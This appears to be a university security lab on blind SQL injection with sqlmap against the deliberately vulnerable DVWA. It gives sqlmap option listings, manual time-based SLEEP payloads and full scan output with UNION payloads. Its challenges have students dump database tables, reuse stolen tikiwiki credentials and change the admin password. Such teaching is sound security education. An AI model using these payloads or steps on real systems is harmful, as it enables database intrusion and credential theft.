<img src="https://www.tamusa.edu/brandguide/jpeglogos/tamusa_final_logo_bw1.jpg" width="200" height="100"> 

# More SQLi with sqlmap

## sqlmap Options
There is no shortage of sqlmap options. The -hh option will list all options. The following list has been truncated but some interesting options have been retained in the list. We will not cover all of these options, but let's look at few.
```
$ sqlmap -hh 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.6.7#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    --- truncated ---
    -r REQUESTFILE      Load HTTP request from a file
    --- truncated ---
    
  Request:
    These options can be used to specify how to connect to the target URL

    -A AGENT, --user..  HTTP User-Agent header value
    --- truncated ---
    --random-agent      Use randomly selected HTTP User-Agent header value
    --- truncated ---

  Optimization:
    These options can be used to optimize the performance of sqlmap

    -o                  Turn on all optimization switches
    --- truncated ---
    --threads=THREADS   Max number of concurrent HTTP(s) requests (default 1)

  Injection:
    These options can be used to specify which parameters to test for,
    provide custom injection payloads and optional tampering scripts

    --- truncated ---
    --dbms=DBMS         Force back-end DBMS to provided value
    --- truncated ---

  Detection:
    These options can be used to customize the detection phase

    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)
    --- truncated ---

  Techniques:
    These options can be used to tweak testing of specific SQL injection
    techniques

    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
    --- truncated ---
    --second-req=SEC..  Load second-order HTTP request from file

  Fingerprint:
    -f, --fingerprint   Perform an extensive DBMS version fingerprint

  Enumeration:
    These options can be used to enumerate the back-end database
    management system information, structure and data contained in the
    tables

    -a, --all           Retrieve everything
    -b, --banner        Retrieve DBMS banner
    --current-user      Retrieve DBMS current user
    --current-db        Retrieve DBMS current database
    --hostname          Retrieve DBMS server hostname
    --is-dba            Detect if the DBMS current user is DBA
    --users             Enumerate DBMS users
    --passwords         Enumerate DBMS users password hashes
    --privileges        Enumerate DBMS users privileges
    --roles             Enumerate DBMS users roles
    --dbs               Enumerate DBMS databases
    --tables            Enumerate DBMS database tables
    --columns           Enumerate DBMS database table columns
    --schema            Enumerate DBMS schema
    --count             Retrieve number of entries for table(s)
    --dump              Dump DBMS database table entries
    --dump-all          Dump all DBMS databases tables entries
    --search            Search column(s), table(s) and/or database name(s)
    --comments          Check for DBMS comments during enumeration
    --statements        Retrieve SQL statements being run on DBMS
    -D DB               DBMS database to enumerate
    -T TBL              DBMS database table(s) to enumerate
    -C COL              DBMS database table column(s) to enumerate
    -X EXCLUDE          DBMS database identifier(s) to not enumerate
    -U USER             DBMS user to enumerate
    --- truncated ---
    --sql-query=SQLQ..  SQL statement to be executed
    --sql-shell         Prompt for an interactive SQL shell
    --sql-file=SQLFILE  Execute SQL statements from given file(s)

  Brute force:
    These options can be used to run brute force checks

    --- truncated ---

  User-defined function injection:
    These options can be used to create custom user-defined functions

    --udf-inject        Inject custom user-defined functions
    --shared-lib=SHLIB  Local path of the shared library

  File system access:
    These options can be used to access the back-end database management
    system underlying file system

    --- truncated ---

  Operating system access:
    These options can be used to access the back-end database management
    system underlying operating system

    --os-cmd=OSCMD      Execute an operating system command
    --os-shell          Prompt for an interactive operating system shell
    --os-pwn            Prompt for an OOB shell, Meterpreter or VNC
    --os-smbrelay       One click prompt for an OOB shell, Meterpreter or VNC
    --os-bof            Stored procedure buffer overflow exploitation
    --priv-esc          Database process user privilege escalation
    --msf-path=MSFPATH  Local path where Metasploit Framework is installed
    --tmp-path=TMPPATH  Remote absolute path of temporary files directory

  Windows registry access:
    These options can be used to access the back-end database management
    system Windows registry

    --- truncated ---

  General:
    These options can be used to set some general working parameters

    --- truncated ---

  Miscellaneous:
    These options do not fit into any other category

    --- truncated ---                                                                         
```
## The Target

This exercise uses DVWA's **SQL Injection (Blind)** page (URI /dvwa/vulnerabilities/sqli_blind/) and **Security Level = Medium**.

### Challenge 1: Prepare DVWA
1. Browse to DVWA using Burp Suite
2. Login to DVWA
3. Set Security Level = **Medium**
4. Browse to **/dvwa/vulnerabilities/sqli_blind**
5. Submit a random User ID, such as 100, and click **Submit**
6. Copy the GET request from Burp Suite and save it in a file in Kali

## Understanding Blind SQLi

Blind SQLi is similar to the SQLi attacks practiced in previous exercises but without the benefit of SQL errors. Suppressing SQL errors makes detecting and exploiting SQLi vulnerabilities more challenging but ultimately does not defend against SQLi attacks. Let's demonstrate. We know the page /dvwa/vulnerabilities/sqli_blind is vulnerable to SQLi, so try the escape string values **'** and **"**. 

We know at least one of values (' or ") should force a SQL error, but in this case, neither value returns a SQL error. However, other techniques reveal if SQL statements can be modified. Try the following requests manually. Observe the delay before the page loads.

```
100 AND (SELECT 9999 FROM (SELECT(SLEEP(5)))randomTable)

100 OR (SELECT 9999 FROM (SELECT(SLEEP(5)))randomTable)
```

The AND statement forced a 5 second delay before the page loaded. The delay may be subtle and easy to overlook. The same request can be submitted using Burp's Repeater tool. The 5 secod delay is easily noticed using Repeater.

The OR statement returned a SQLi result. That result from the OR statement is unique to this application. OR statements will not always return results when using delay-based blind SQLi. 

These statements confirm that the application is vulnerable to SQLi.

## Automating Blind SQLi with sqlmap
### Challenge 2: Detect the DBMS and Confirm SQLi Vulnerability

Start with a basic scan, but first flush and purge sqlmap's cache. The bold sections emphasize the results we are interested in.

```
sqlmap --flush-session --purge
        ___
       __H__                                                                                              
 ___ ___[,]_____ ___ ___  {1.6.7#stable}                                                                  
|_ -| . ["]     | .'| . |                                                                                 
|___|_  [)]_|_|_|__,|  _|                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:12:55 /2022-11-15/

[08:12:55] [INFO] purging content of directory '/home/kbarton/.local/share/sqlmap'...

[*] ending @ 08:13:17 /2022-11-15/

```
Now, start a new attack.

<pre>
sqlmap -r dvwa-b.txt                
        ___
       __H__                                                                                              
 ___ ___[(]_____ ___ ___  {1.6.7#stable}                                                                  
|_ -| . [,]     | .'| . |                                                                                 
|___|_  [)]_|_|_|__,|  _|                                                                                 
      |_|V...       |_|   https://sqlmap.org                                                              

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 08:13:25 /2022-11-15/

[08:13:25] [INFO] parsing HTTP request from 'dvwa-b.txt'
<b>[08:13:25] [INFO] testing connection to the target URL</b>
[08:13:25] [INFO] checking if the target is protected by some kind of WAF/IPS
[08:13:26] [INFO] testing if the target URL content is stable
[08:13:26] [INFO] target URL content is stable
[08:13:26] [INFO] testing if GET parameter 'id' is dynamic
[08:13:27] [WARNING] GET parameter 'id' does not appear to be dynamic
[08:13:28] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[08:13:28] [INFO] testing for SQL injection on GET parameter 'id'
[08:13:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[08:13:31] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[08:13:32] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'                                                                                                
[08:13:35] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[08:13:37] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[08:13:40] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[08:13:43] [INFO] testing 'Generic inline queries'
[08:13:44] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[08:13:46] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[08:13:48] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
<b>[08:13:50] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[08:14:02] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable </b>
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[08:15:37] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[08:15:37] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[08:15:38] [WARNING] reflective value(s) found and filtering out
[08:15:47] [INFO] target URL appears to be UNION injectable with 2 columns
[08:15:49] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 69 HTTP(s) requests:
---
<b>Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=100 AND (SELECT 4544 FROM (SELECT(SLEEP(5)))tHeh)&Submit=Submit

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=100 UNION ALL SELECT NULL,CONCAT(0x71626b6271,0x705464434841515a6d76724241654f694e477a7552746b4f45717a7641435758487a614c576c4143,0x717a7a7171)-- -&Submit=Submit</b>
---
[08:16:03] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 8.04 (Hardy Heron)
web application technology: PHP 5.2.4, Apache 2.2.8
back-end DBMS: MySQL >= 5.0.12
[08:16:06] [INFO] fetched data logged to text files under '/home/kbarton/.local/share/sqlmap/output/104.198.70.155'                                                                                                 

[*] ending @ 08:16:06 /2022-11-15/

</pre>

The results demonstrate:
1. The parameter **id** in the targeted URI is vulnerable to time-based SQLi.
2. The query that demonstrated time-based SQLi was **100 AND (SELECT 4544 FROM (SELECT(SLEEP(5)))tHeh)**.
3. The query returns 2 columns. Note that the values included in the UNION ALL SELECT query are random ASCII Hex values.

### Challenge 3: Enumerate Current User and Database

sqlmap can enumerate the current database, current user, and current user's privileges with the options **--current-db**, **--current-user**, and **--privileges**. Enumerate the database, user and user privileges for DVWA.

> :anger: Capture a screenshot of the sqlmap results showing the current database, current user and current user's privileges.

### Challenge 4: Enumerate all Databases available to the Current User

The **--dbs** option will list all databases that the current user has permissions to read or modify. Enumerate all databases that the current user can access.

> :anger: Capture a screenshot of the sqlmap results showing all databases that the current user can access.

### Challenge 4: Dump tables from a Database other than the Current Database

The **--dump-all** option will dump all tables in all databases, but doing so includes the schema. This slow and may not have great value. There are times when tables in a specific database need to be dumped but there is no interest in dumping all tables from all databases. 

The **-D** option enumerates a specific database. When combined with the **--dump** option, the **-D** option is useful for dumping tables in a specific database. 

Dump the tables in the database **tikiwiki**. This scan will take time. Consider increasing the number of threads with the **--threads=** option. By default, sqlmap uses 1 thread. Consider trying 10 threads.

> :anger: Capture a screenshot of the tikiwiki table that shows tables from tikiwiki being dumped.

### Challenge 5: Tikiwiki login

Dumped tables will be stored in .csv file in a subdirectory of your home directory. For example, **/home/username/.local/share/sqlmap/output/hostname_ip-address/dump/tikiwiki/**. Find login credentials for tikiwiki. Browse to the URI **/tikiwiki/** and follow the installation wizard to finish setting up tikiwiki. Database settings will be:

|||
|---|---|
|**Host**|localhost|
|**User**|root|
|**Password**||
|**Database**|tikiwiki|

Use the stolen credentials to login to tikiwiki. You will be prompted to change the admin user's password. Change the password.

Dump the tikiwiki users_users table a second time. Ensure fresh queries are run. The -T option is used to dump specific tables, rather than all tables in the database.

Include the following options:

```
-D tikiwiki -T users_users --dump --fresh-queries
```

> :anger: Capture a screenshot of the new admin user password or hashed password.


### Challenge 6: Crawl, Level, and Risk Options
**Crawl** enables sqlmap to crawl a website to discover and test possible injection points. This is useful in large applications that have dozens or hundreds of possible injection points. Depth defines how many directories deep the crawler will examine.

**Level** defines the number of payloads used to test for SQLi vulnerabilities. **Level can be set for 1-5**, where **--level 1** is the default setting. Increasing level increases the number of payloads tested but also significantly increases the time required to test each possible injection point.

**Risk** defines the types of payloads used by sqlmap. Some payloads have greater risk of negatively impacting the targeted application, dbms or database. Increasing risk can help discover difficult SQLi exploits but also increases the possibility of interrupting the function of the application or database. **Risk options are 1-3** where the default is 1.

1. Edit the request file to set the security cookie at **high**.
2. Flush and purge cached sqlmap results: **sqlmap --flush-session --purge**
3. The --dbms option can be used when the backend dbms is known. This reduces the number of queries run to detect the dbms. We know the backend dbms is mysql, so include the option **--dbms mysql** to reduce the number of queries run.
4. Attempt to exploit the DVWA application with sqlmap with the security cookie set at high. Vary --level, --risk and other options to see if the URI /dvwa/vulnerabilities/sqli_blind/ can be exploited with sqlmap. Consider using additional threads to increase the rate of attack.

> :anger: Report your findings. Were you able to exploit the application? What options did you attempt what results did you have with those options?
